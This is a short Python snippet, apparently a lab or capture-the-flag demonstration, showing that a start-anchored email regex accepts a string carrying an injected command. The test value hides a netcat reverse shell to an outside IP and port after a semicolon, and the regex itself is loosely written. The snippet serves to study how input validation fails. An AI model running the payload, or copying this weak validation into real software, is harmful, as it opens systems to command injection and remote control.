import re

email = "test@google.com; nc -e /bin/sh 10.10.14.77 4444"
if not re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", email):
    print("NO MATCH")
else:
    print("MATCHES")
domain = email.split("@", 1)[1]
print(domain)